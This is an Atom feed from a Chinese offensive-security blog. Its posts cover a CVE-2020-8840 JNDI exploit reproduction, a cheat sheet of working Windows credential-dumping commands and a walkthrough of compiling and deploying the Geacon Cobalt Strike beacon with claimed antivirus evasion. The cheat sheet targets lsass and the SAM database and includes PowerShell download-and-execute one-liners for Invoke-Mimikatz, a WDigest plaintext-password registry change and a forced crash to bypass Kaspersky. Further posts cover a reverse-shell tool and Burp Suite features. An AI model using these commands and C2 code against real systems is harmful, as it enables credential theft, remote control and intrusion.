<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://thekingofduck.github.io</id>
    <title>CoolCat&apos; Blog</title>
    <updated>2020-02-28T10:00:31.685Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://thekingofduck.github.io"/>
    <link rel="self" href="https://thekingofduck.github.io/atom.xml"/>
    <subtitle>当代废物</subtitle>
    <logo>https://thekingofduck.github.io/images/avatar.png</logo>
    <icon>https://thekingofduck.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, CoolCat&apos; Blog</rights>
    <entry>
        <title type="html"><![CDATA[CVE-2020-8840复现]]></title>
        <id>https://thekingofduck.github.io/post/CVE-2020-8840/</id>
        <link href="https://thekingofduck.github.io/post/CVE-2020-8840/">
        </link>
        <updated>2020-02-25T11:02:24.000Z</updated>
        <content type="html"><![CDATA[<p>Windows环境下执行命令的将下面的代码编译成class放到服务器上</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1582827828394.png" alt="" loading="lazy"></figure>
<p>在class的同目录执行：</p>
<pre><code>python -m http.server 8080
</code></pre>
<p>开启一个简陋的web服务。</p>
<p>然后执行：</p>
<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://localhost:8080/#Exploit
</code></pre>
<p>开启ldap服务。</p>
<p>执行POC：</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1582827821182.png" alt="" loading="lazy"></figure>
<p>大功告成</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1582827319103.png" alt="" loading="lazy"></figure>
<p>如代码所示，需要开启enableDefaultTyping方法才能成功，非默认配置。</p>
<p>踩坑：把exp代码放到package中会加载后执行不成功，独立出来就好了。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Windows本地hashdump备忘录]]></title>
        <id>https://thekingofduck.github.io/post/Dumping-Windows-Local-Credentials-Tools/</id>
        <link href="https://thekingofduck.github.io/post/Dumping-Windows-Local-Credentials-Tools/">
        </link>
        <updated>2020-02-23T12:21:08.000Z</updated>
        <content type="html"><![CDATA[<p>市面上可见到的读Windows本地密码的大多工具都是变则法子的去读lsass.exe这个密码的内存或者SAM数据库，然后从里面提取hash。所以有杀软的情况下读密码这事根本就不是工具免不免杀的问题，而是杀软有没有监控保护lsass.exe或SAM的问题，所以读本地密码条件可以总结为：</p>
<blockquote>
<p>能正常访访问lsass.exe内存或SAM数据库。</p>
</blockquote>
<h3 id="常见工具">常见工具</h3>
<p>工具仅部分，通过以下操作可一键获取密码。</p>
<h4 id="mimikatz">mimikatz</h4>
<p>https://github.com/gentilkiwi/mimikatz</p>
<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;  &quot;exit&quot;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1582465339806.png" alt="" loading="lazy"></figure>
<h4 id="quarkspwdump">QuarksPwDump</h4>
<p>https://github.com/quarkslab/quarkspwdump</p>
<pre><code>QuarksPwDump.exe -dhl
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1582466664583.png" alt="" loading="lazy"></figure>
<h4 id="wce">wce</h4>
<p>https://www.ampliasecurity.com/research/wcefaq.html</p>
<pre><code>wce.exe -w
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1582468276845.png" alt="" loading="lazy"></figure>
<h4 id="pwdump7">pwdump7</h4>
<p>http://www.tarasco.org/security/pwdump_7/index.html</p>
<pre><code>PwDump7.exe
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1582469996459.png" alt="" loading="lazy"></figure>
<h4 id="lazagne">LaZagne</h4>
<p>https://github.com/AlessandroZ/LaZagne</p>
<pre><code>laZagne_x86.exe windows
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1582470996820.png" alt="" loading="lazy"></figure>
<h3 id="lsass内存dump">lsass内存dump</h3>
<p>工具仅部分，通过以下操作可先获取到lsass内存文件，然后使用mimikatz可进一步读取密码。<br>
参考命令:</p>
<pre><code>mimikatz.exe&quot;sekurlsa::minidump lsass.dmp&quot;&quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;
</code></pre>
<h4 id="sharpdump">SharpDump</h4>
<p>https://github.com/GhostPack/SharpDump</p>
<pre><code>for /f  &quot;tokens=2&quot; %i in ('tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; /NH') do SharpDump.exe %i
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/1582476581586.png" alt="" loading="lazy"></figure>
<h4 id="procdump">ProcDump</h4>
<p>https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</p>
<pre><code>Procdump.exe -accepteula -ma lsass.exe lsass.dmp
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/1582471683393.png" alt="" loading="lazy"></figure>
<h4 id="sqldumper">SqlDumper</h4>
<p>https://support.microsoft.com/en-us/help/917825/use-the-sqldumper-exe-utility-to-generate-a-dump-file-in-sql-server</p>
<pre><code>for /f  &quot;tokens=2&quot; %i in ('tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; /NH') do Sqldumper.exe %i 0 0x01100
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/1582473006736.png" alt="" loading="lazy"></figure>
<h4 id="rundll32">rundll32</h4>
<p>https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/</p>
<pre><code>for /f  &quot;tokens=2&quot; %i in ('tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; /NH') do rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump %i .\lsass.dmp full
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/1582475904292.png" alt="" loading="lazy"></figure>
<h3 id="关于sam数据库">关于SAM数据库</h3>
<p>管理员执行:</p>
<pre><code>reg save hklm\sam .\sam.hive&amp;reg save hklm\system .\system.hive
</code></pre>
<p>然后将两个文件导入SAMInside并将NT-Hash复制出来去相关网站查询即可。（mimikatz也可以读）</p>
<h3 id="关于无文件加载">关于无文件加载</h3>
<pre><code>powershell &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds&quot;
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/1582480293151.png" alt="" loading="lazy"></figure>
<p>读一下代码会发现都是peloader做的，同理可以把procdump做成psh实现无文件dump。</p>
<pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TheKingOfDuck/hashdump/master/procdump/procdump.ps1');Invoke-Procdump64 -Args '-accepteula -ma lsass.exe lsass.dmp'&quot;
</code></pre>
<figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/1582492124419.png" alt="" loading="lazy"></figure>
<h3 id="关于2012以及win10之后的机器">关于2012以及win10之后的机器：</h3>
<pre><code>reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
</code></pre>
<p>键值为1时Wdigest Auth保存明文口令，为0则不保存明文。修改为重新登录生效。</p>
<h3 id="偏激的bypass卡巴读密码">偏激的bypass卡巴读密码</h3>
<p>卡巴以及小红伞均对lsass.exe进行了保护，导致微软出的两款工具以及他自己的kldumper都无法用于dump lsass。但是可以通过制造蓝屏来获取所有内存的文件MEMORY.DMP没然后在提出lsass进一步读取。</p>
<pre><code>taskkill /f /im &quot;wininit.exe&quot;
</code></pre>
<p>可参考: https://www.mrwu.red/web/2000.html</p>
<h3 id="总结">总结</h3>
<p>bypass av可以以卡巴为衡量标准，能过卡巴约等于过全部。</p>
<p>所以文件最终文件放在：</p>
<p>https://github.com/TheKingOfDuck/hashdump</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ApkAnalyser：一键提取安卓应用中可能存在的敏感信息。]]></title>
        <id>https://thekingofduck.github.io/post/ApkAnalyser/</id>
        <link href="https://thekingofduck.github.io/post/ApkAnalyser/">
        </link>
        <updated>2020-02-21T13:20:47.000Z</updated>
        <content type="html"><![CDATA[<p>✔️即兴开发，Enjoy it~~<!-- more --></p>
<p>项目地址：https://github.com/TheKingOfDuck/ApkAnalyser</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1582291987982.png" alt="" loading="lazy"></figure>
<p>目前提取了APK内:</p>
<ul>
<li>
<p>所有字符串</p>
</li>
<li>
<p>所以URLs</p>
</li>
<li>
<p>所有ip</p>
</li>
<li>
<p>可能是hash值的字符串</p>
</li>
<li>
<p>存在的敏感词（如oss.aliyun）</p>
</li>
<li>
<p>可能是accessKey的值</p>
<p>使用Python开发，依赖于apkutils模块，可执行文件使用pyinstaller打包。</p>
</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ReverseGoShell：一款动态加密的反弹shell管理工具]]></title>
        <id>https://thekingofduck.github.io/post/ReverseGoShell/</id>
        <link href="https://thekingofduck.github.io/post/ReverseGoShell/">
        </link>
        <updated>2020-02-21T12:08:34.000Z</updated>
        <summary type="html"><![CDATA[<p>即兴开发。</p>
]]></summary>
        <content type="html"><![CDATA[<p>即兴开发。</p>
<!-- more -->
<p>Github: https://github.com/TheKingOfDuck/ReverseGoShell/</p>
<h3 id="description">Description:</h3>
<p>A Golang Reverse Shell Tools With AES Dynamic Encryption</p>
<pre><code> _____                               _____       _____ _          _ _ 
|  __ \     Code By: CoolCat       / ____|     / ____| |        | | |
| |__) |_____   _____ _ __ ___  ___| |  __  ___| (___ | |__   ___| | |
|  _  // _ \ \ / / _ \ '__/ __|/ _ \ | |_ |/ _ \\___ \| '_ \ / _ \ | |
| | \ \  __/\ V /  __/ |  \__ \  __/ |__| | (_) |___) | | | |  __/ | |
|_|  \_\___| \_/ \___|_|  |___/\___|\_____|\___/_____/|_| |_|\___|_|_| 
 - | Modules    | - Function.
 - | checkav    | - Show Remote-Host Info.
 - | Download   | - Download File from Remote-Host to Local-Host.
 - | Keyloger   | - Unfinished.
 - | Screenshot | - Unfinished.

</code></pre>
<h3 id="useage">Useage:</h3>
<h4 id="build">Build</h4>
<pre><code>go build server.go
go build client.go
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1582287277450.jpg" alt="" loading="lazy"></figure>
<h4 id="run">Run</h4>
<pre><code>server 55555
client 127.0.0.1:55555
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1582287290541.jpg" alt="" loading="lazy"></figure>
<h3 id="features">Features</h3>
<p>1.AES Dynamic encryption<br>
2.Supports Multiple Shells</p>
<h3 id="about">About</h3>
<p>这个项目只是自己学习Golang过程中实践的产物，代码写得很垃圾，但是注释都尽量写清楚的，通讯流量走tcp协议，采用aes动态加密，可以说是完全模仿冰蝎。基础功能执行命令已实现，模块化的检查存在的杀毒软件以及下载文件写完，其他模块还得在花时间。相比同类小工具我觉得最大的优点就是支持了动态加密，并且可以同时管理多个会话。</p>
<p><strong>本项目接受建议</strong></p>
<p>比如希望增加特定功能，再比如某个位置代码写得不规范，或是有bug，有空我会慢慢改。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Geacon代码通读&上线指南]]></title>
        <id>https://thekingofduck.github.io/post/geacon-program-code-analysis/</id>
        <link href="https://thekingofduck.github.io/post/geacon-program-code-analysis/">
        </link>
        <updated>2020-02-19T12:42:37.000Z</updated>
        <summary type="html"><![CDATA[<p>Implement CobaltStrike's Beacon in Go</p>
]]></summary>
        <content type="html"><![CDATA[<p>Implement CobaltStrike's Beacon in Go</p>
<!-- more -->
<h3 id="0x01-写在前面">0x01 写在前面</h3>
<p>项目地址: https://github.com/darkr4y/geacon</p>
<p>项目说明:</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/readme.png" alt="readme" loading="lazy"></figure>
<p>这都说了啥...正好在拿go写c2，看下逻辑学习一下。</p>
<p>代码目录：</p>
<pre><code>├─cmd
│  │  main.go                             //主程序
│  │
│  ├─config
│  │      c2profile.go
│  │      config.go                       //c2配置
│  │
│  ├─crypt
│  │      aes.go
│  │      rand.go
│  │      rsa.go
│  │
│  ├─packet
│  │      commands.go
│  │      http.go
│  │      packet.go
│  │
│  ├─sysinfo
│  │      meta.go
│  │      sysinfo_darwin.go
│  │      sysinfo_linux.go
│  │      sysinfo_windows.go
│  │
│  └─util
│          util.go
│
├─scripts
│      icons.cna                           //cs脚本
│
└─tools
    └─BeaconTool                           //Beacon RSA生成工具
</code></pre>
<h3 id="0x02-代码分析">0x02 代码分析</h3>
<p>主程序mian.go在cmd目录下:</p>
<pre><code>package main

import (
	&quot;bytes&quot;
	&quot;fmt&quot;
	&quot;geacon/cmd/config&quot;
	&quot;geacon/cmd/crypt&quot;
	&quot;geacon/cmd/packet&quot;
	&quot;geacon/cmd/util&quot;
	&quot;io&quot;
	&quot;os&quot;
	&quot;time&quot;
)



func main() {

	ok := packet.FirstBlood()
	if ok {
		for ; ;  {
			resp := packet.PullCommand()
			if resp != nil {
				totalLen := resp.Response().ContentLength
				if totalLen &gt; 0 {
					hmacHash := resp.Bytes()[totalLen - crypt.HmacHashLen :]
					fmt.Printf(&quot;hmac hash: %v\n&quot;, hmacHash)
					//TODO check the hmachash
					restBytes := resp.Bytes()[ : totalLen - crypt.HmacHashLen]
					decrypted := packet.DecryptPacket(restBytes)
					timestamp := decrypted[:4]
					fmt.Printf(&quot;timestamp: %v\n&quot;,timestamp)
					lenBytes := decrypted[4:8]
					packetLen := packet.ReadInt(lenBytes)

					decryptedBuf := bytes.NewBuffer(decrypted[8:])
					for ; ;  {
						if packetLen &lt;= 0 {
							break
						}
						cmdType , cmdBuf := packet.ParsePacket(decryptedBuf , &amp;packetLen)
						if cmdBuf != nil {
							switch cmdType {
							//shell
							case packet.CMD_TYPE_SHELL:
								shellPath , shellBuf := packet.ParseCommandShell(cmdBuf)
								result := packet.Shell(shellPath,shellBuf)
								finalPaket := packet.MakePacket(0,result)
								packet.PushResult(finalPaket)

							case packet.CMD_TYPE_UPLOAD_START:
								filePath , fileData := packet.ParseCommandUpload(cmdBuf)
								packet.Upload(string(filePath),fileData)

							case packet.CMD_TYPE_UPLOAD_LOOP:
								filePath , fileData := packet.ParseCommandUpload(cmdBuf)
								packet.Upload(string(filePath),fileData)

							case packet.CMD_TYPE_DOWNLOAD:
								filePath := cmdBuf
								//TODO encode
								strFilePath := string(filePath)
								fileInfo, err := os.Stat(strFilePath)
								if err != nil {
									//TODO notify error to c2
									break
								}
								fileLen := fileInfo.Size()
								test := int(fileLen)
								fileLenBytes := packet.WriteInt(test)
								requestID := crypt.RandomInt(10000, 99999)
								requestIDBytes := packet.WriteInt(requestID)
								result := util.BytesCombine(requestIDBytes,fileLenBytes,filePath)
								finalPaket := packet.MakePacket(2,result)
								packet.PushResult(finalPaket)

								fileHandle , err := os.Open(strFilePath)
								if err != nil {
									break
								}
								var fileContent []byte
								fileBuf := make([]byte, 512 * 1024)
								for ; ;  {
									n, err := fileHandle.Read(fileBuf)
									if err != nil &amp;&amp; err != io.EOF {
										break
									}
									if n == 0 {
										break
									}
									fileContent = fileBuf[:n]
									result = util.BytesCombine(requestIDBytes,fileContent)
									finalPaket = packet.MakePacket(8,result)
									packet.PushResult(finalPaket)
								}

								finalPaket = packet.MakePacket(9,requestIDBytes)
								packet.PushResult(finalPaket)



							case packet.CMD_TYPE_SLEEP:
								sleep := packet.ReadInt(cmdBuf[:4])
								//jitter := packet.ReadInt(cmdBuf[4:8])
								//fmt.Printf(&quot;Now sleep is %d ms, jitter is %d\n&quot;,sleep,jitter)
								config.WaitTime = time.Duration(sleep) * time.Millisecond

							default:
								errIdBytes := packet.WriteInt(0) // must be zero
								arg1Bytes := packet.WriteInt(0) // for debug
								arg2Bytes := packet.WriteInt(0)
								errMsgBytes := []byte(&quot;You are now using geacon coded by darkr4y,and he may not have implemented this feature yet cuz life is shit.&quot;)
								result := util.BytesCombine(errIdBytes,arg1Bytes,arg2Bytes,errMsgBytes)
								finalPaket := packet.MakePacket(31,result)
								packet.PushResult(finalPaket)


							}
						}
					}
				}
			}			time.Sleep(config.WaitTime)
		}
	}

	
}
</code></pre>
<p>main.go line 3-13 导入包<br>
main.go line 16 程序入口<br>
main.go line 18 调用packet中的FirstBlood方法（packet.go line 158-170）,代码如下：</p>
<pre><code>func FirstBlood() bool {//定义返回类型为布尔值
    
    /*
    调用EncryptedMetaInfo方法（packet.go line 130-156）并赋值给encryptedMetaInfo。
    其中EncryptedMetaInfo方法的作用是调用MakeMetaInfo方法（packet.go line 118-128）并将该方法返回的值字节交给rsa.go中RsaEncrypt方法加密，最终返回加密后的字符串。
    其中RsaEncrypt在rsa.go line 12-24，在line 14会发现它调用了config.go中line 8 RsaPublicKey变量的值。此处是后面需要修改后再编译的位置1。
    */
	encryptedMetaInfo = EncryptedMetaInfo() 

    
    /*
    调用HttpGet函数循环发送上线包，如果发送成功就打断循环，休眠，返回True给main.go line 18的ok。
    其中config.GetUrl为在config.go中line 31 GetUrl变量的值，由plainHTTP,C2变量以及字符串&quot;/load&quot;拼接而成，此处也是后面需要修改后再编译的位置2。   
    */
    
	for ; ;  {
		resp := HttpGet(config.GetUrl,encryptedMetaInfo)
		if resp != nil {
			fmt.Printf(&quot;firstblood: %v\n&quot;,resp)
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	

	time.Sleep(config.WaitTime)
	return true
}
</code></pre>
<p>main.go line 19  判断上线包是否发送成功，如果成功进入下一部分，不成功则不执行任何代码。</p>
<p>main.go line 20  开始for循环</p>
<p>main.go line 21  该部分为心跳包，调用packet中的PullCommand方法（packet.go line 172-177）循环发送变量encryptedMetaInfo(在发送上线包时获取到的),代码如下：</p>
<pre><code>func PullCommand() *req.Resp {
    /*
    此处未作容错处理，而是直接将所有返回包丢给下一行处理。
    */
	resp := HttpGet(config.GetUrl,encryptedMetaInfo)
	fmt.Printf(&quot;pullcommand: %v\n&quot;,resp.Request().URL)
	return resp
}
</code></pre>
<p>main.go line 22-23 如果代码没出错就接着运行，出错了就休眠一会儿在继续。休眠时长在config.go中line 20 WaitTime变量中获取<br>
main.go line 24-25  获取resp中返回包中Content-Length的值,如果大于0就继续运行<br>
main.go line 25-36  计算消息hmacHash,restBytes等,然后调用packet中的DecryptPacket方法（packet.go line 40-46）对消息进行解密。具体变量类型之类的可参考：</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/debug.png" alt="debug" loading="lazy"></figure>
<p>main.go line 37-40 开始下一个循环，并在循环前先判断packetLen的字节是否小于0，如果是就打断循环。</p>
<p>main.go line 41 调用packet.go中ParsePacket方法(line 54-76)处理decryptedBuf 和&amp;packetLen并返回commandType和commandBuf。（计算过程复杂，此处不作详细，可cs生成的paylaod进行理解）</p>
<p>main.go line 42-120行 根据返回的cmdType的不同执行不同的功能模块，以执行命令为例，假如cmdType的返回值为78时就会进入命令执行流程，代码如下：</p>
<pre><code>/*
packet.CMD_TYPE_SHELL的值为command.go line 14的CMD_TYPE_SHELL常量
如果条件满足则调用packet.go中ParseCommandShell方法(line 20-47)处理cmdBuf，并将处理结果交给Shell方法(line 49-76)执行命令。后续即将执行结果发送回控制端。
*/
switch cmdType {
//shell
case packet.CMD_TYPE_SHELL:
	shellPath , shellBuf := packet.ParseCommandShell(cmdBuf)
	result := packet.Shell(shellPath,shellBuf)
	finalPaket := packet.MakePacket(0,result)
	packet.PushResult(finalPaket)
</code></pre>
<p>传送执行结果的方法代码如下：</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/PushResult.png" alt="PushResult" loading="lazy"></figure>
<p>执行命令的方法如下：</p>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/Shell.png" alt="Shell" loading="lazy"></figure>
<p>可以看到作者有考虑到多平台上线问题。</p>
<p>可惜：</p>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/Shell2.png" alt="Shell2" loading="lazy"></figure>
<p>cmdType的值没有计算正确（测试环境 win10下）</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/cmd.png" alt="cmd" loading="lazy"></figure>
<p>尝试过多平台兼容的人都知道有多狗。（golang版本问题，需要更新）</p>
<p>最后如果没有对上会进入作者写的一个debug流程，然后回传到服务器告诉你：</p>
<pre><code>You are now using geacon coded by darkr4y,and he may not have implemented this feature yet cuz life is shit.
</code></pre>
<h3 id="0x03-编译上线">0x03 编译上线</h3>
<p>如果有仔细看上面的代码分析会发现所有的c2配置作者都放到了config/config.go里面，对于修改后再编译就可以了。</p>
<p>上线共分为三步：</p>
<h4 id="加载iconscna">加载icons.cna</h4>
<p>加载cs插件...</p>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/icons.png" alt="icons" loading="lazy"></figure>
<p>如名字所写，其作用修改beacon会话图标的。</p>
<h4 id="rsa公钥私钥生成">RSA公钥/私钥生成</h4>
<p>作者在项目里提供了生成工具（/tools/BeaconTool）：</p>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/tools1.png" alt="tools1" loading="lazy"></figure>
<p>pemPublicBase64以及pemPrivateBase64即为需要的值，.beacon_keys其实就是cs根目录下的.cobaltstrike.beacon_keys文件。</p>
<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/tools2.png" alt="tools2" loading="lazy"></figure>
<p>下载该文件，改下代码，运行一下即可获取需要的值:</p>
<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/tools3.png" alt="tools3" loading="lazy"></figure>
<h4 id="编译上线">编译上线</h4>
<p>直接将代码clone到GOPATH下(避免文件来回复制),然后修改/beacon/cmdconfig/config.go</p>
<figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/code.png" alt="code" loading="lazy"></figure>
<p>改完go build main.go一下，上线。</p>
<figure data-type="image" tabindex="12"><img src="https://thekingofduck.github.io/post-images/on.png" alt="on" loading="lazy"></figure>
<p>如图一台linux一台Windows，mac维修去了，尚未测试。</p>
<h3 id="0x04-总结">0x04 总结</h3>
<p>正常打包后7M，upx压缩一下2m。卡巴和火绒正常上线，免杀。</p>
<figure data-type="image" tabindex="13"><img src="https://thekingofduck.github.io/post-images/avs.png" alt="avs" loading="lazy"></figure>
<p>bug挺多的，不过基础功能已经实现了，跟着逻辑调整一下还是会很香的。</p>
<hr>
<p>The End ，继续写bug。</p>
<hr>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[聊聊 Burpsuite Engagement Tools]]></title>
        <id>https://thekingofduck.github.io/post/burpsuite-engagement-tools/</id>
        <link href="https://thekingofduck.github.io/post/burpsuite-engagement-tools/">
        </link>
        <updated>2020-02-11T12:31:18.000Z</updated>
        <summary type="html"><![CDATA[<p>直入burp右键菜单中的Engagement tools，中文翻译为作战工具。</p>
]]></summary>
        <content type="html"><![CDATA[<p>直入burp右键菜单中的Engagement tools，中文翻译为作战工具。</p>
<!-- more -->
<!-- more -->
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/main.png" alt="main" loading="lazy"></figure>
<p>从上往下依次为</p>
<pre><code>Search                        搜索
Find Comments                 查找注释
Find scripts                  查找js代码
Find references               查找引用
Analyze target                分析目标
Discover content              内容勘测
Schedule task                 定时任务
Simulate manual testing       人工模拟
</code></pre>
<p>以上翻译属于个人理解，非字面意思。如有不同见解，欢迎交流。</p>
<p>依次聊一下个人的使用心得：</p>
<h3 id="0x01-search-搜索">0x01 Search 搜索</h3>
<p>在选定的上右键打开后默认如下：</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/search1.png" alt="search1" loading="lazy"></figure>
<p>输入字符串即可查找需要的字符串，相当于浏览器view-source后再Ctrl + F查找字符串。</p>
<p>如果只用到这里的话有点不太黑阔，正则搜索这么强大，不用可惜了。</p>
<p>贴一条自己常用的正则：</p>
<pre><code>(.user|pass|accessKeyId|accessKeySecret|secretToken|callback|admin|config|key|access|token?)
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/search2.png" alt="search2" loading="lazy"></figure>
<p>擅用该功能，在SRC捡洞可能可能只是一个习惯而已。（比如每次准备关Burp之前考虑全选site map中所有的站点，再拿正则去尝试一下。）</p>
<h3 id="0x02-find-comments-查找注释">0x02 Find Comments 查找注释</h3>
<p>选择目标右键打开后如下图：</p>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/Comments1.png" alt="Comments1" loading="lazy"></figure>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/Comments2.png" alt="Comments2" loading="lazy"></figure>
<p>可以理解为Search功能的正则写为:</p>
<pre><code>&lt;!--(.*?)--&gt;
</code></pre>
<p>不同语言的注释不一样，burp内置的正则更为全面。测试过程中适当看一下注释内容，没准一个未授权就出来了。</p>
<h3 id="0x03-find-scripts-查找js代码">0x03 Find scripts 查找js代码</h3>
<p>选择目标右键打开后如下图：</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/script1.png" alt="script1" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/script2.png" alt="script2" loading="lazy"></figure>
<p>该功能处理.js后缀的文件之外，页面中script标签的内容也会自动匹配出来。等同于右键看完当前页面的js逻辑后在接着Ctrl F 搜.js然后继续看代码，在Burp里相对方便得多。</p>
<h3 id="0x04-find-references-查找引用">0x04 Find references 查找引用</h3>
<p>选择目标右键打开后如下图：</p>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/references1.png" alt="references1" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/references2.png" alt="references2" loading="lazy"></figure>
<p>如果用过<a href="https://github.com/TheKingOfDuck/myScripts/tree/master/LinksDumper">LinksDumper</a>的话会发现Burp这个功能和它一模一样，都是匹配出页面中存在的各类链接。</p>
<p>默认自带的功能还有不少人是去用插件或者用独立的程序跑。burp自带的它不香咩？</p>
<h3 id="0x05-analyze-target-分析目标">0x05 Analyze target 分析目标</h3>
<p>选择目标右键打开后总共有四个页面</p>
<p>1.总结页面：</p>
<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/Analyze1.png" alt="Analyze1" loading="lazy"></figure>
<p>假设拿到100个目标，筛选软柿子的时候通过总结页面判断一下，寻找交互点多的站点/链接进行单点突破，未尝不是一个高效的选择。</p>
<p>2.动态Urls：</p>
<figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/Analyze2.png" alt="Analyze2" loading="lazy"></figure>
<p>该功能可以快速筛选出带外部参数的url，并统计了参数的数量，秉着交互点越多可能存在的问题就越多的原则，筛选一下，效率++。</p>
<p>3.其他Url：</p>
<figure data-type="image" tabindex="12"><img src="https://thekingofduck.github.io/post-images/Analyze3.png" alt="Analyze3" loading="lazy"></figure>
<p>该功能可以理解为Find references功能遍历出来所有的连接后再去除Dynamic URLs中带交互点的Url的结果。</p>
<p>4.参数统计：</p>
<figure data-type="image" tabindex="13"><img src="https://thekingofduck.github.io/post-images/Analyze4.png" alt="Analyze4" loading="lazy"></figure>
<p>首先是统计了出现过那些参数，其次是这些参数在Url里面出现过次数。有了这个功能在瓶颈渗透提取本站存在的参数时根本不需要第三方插件工具辅助，直接复制name字段即可；某个参数存在漏洞后也可通过该功能查找其他可能存在相同问题的Url。</p>
<h3 id="0x06-discover-content-内容勘测">0x06 Discover content  内容勘测</h3>
<p>该功能秒杀一切目录扫描工具。</p>
<p>下面是关于如何巧用它去递归扫描站点备份的：</p>
<hr>
<p>此前在米斯特<code>BurpSuite 插件生态开发组</code>里有提到想开发一款主动的备份扫描插件，寄生于<code>BurpSuite</code>强大的爬虫功能对每个目录/文件进行备份扫描。写一半发现<code>BurpSuite</code>本来就有这样的功能，只是很少有人用到罢了，本文仅对相关功能进行简要的分析以及优化。</p>
<h4 id="0x06_1-简介">0x06_1 简介</h4>
<p>正常访问时爬虫被动收集到的目录:</p>
<figure data-type="image" tabindex="14"><img src="https://mstwiki.acmesec.cn/static/uploads/eff8945b-a523-413a-951b-645552b448a3.jpg" alt="/static/uploads/eff8945b-a523-413a-951b-645552b448a3.jpg" loading="lazy"></figure>
<p>下面是本文的主角：</p>
<figure data-type="image" tabindex="15"><img src="https://mstwiki.acmesec.cn/static/uploads/43951031-06ef-4dc9-bfc2-b0b00cede03a.jpg" alt="/static/uploads/43951031-06ef-4dc9-bfc2-b0b00cede03a.jpg" loading="lazy"></figure>
<p>位于<code>Engagement tools</code> ==&gt; <code>Discover content</code></p>
<p>看看默认配置：</p>
<figure data-type="image" tabindex="16"><img src="https://mstwiki.acmesec.cn/static/uploads/42332280-aad3-436d-9f14-7bd8adadcdc4.jpg" alt="/static/uploads/42332280-aad3-436d-9f14-7bd8adadcdc4.jpg" loading="lazy"></figure>
<p>图中圈起来的第一部分默认勾选了burp内置的四个字典,第二个圈也是默认配置,其作用时从站点中提取各种目录并递归扫描,前面的配置可根据情况修改,后面不建议动它。</p>
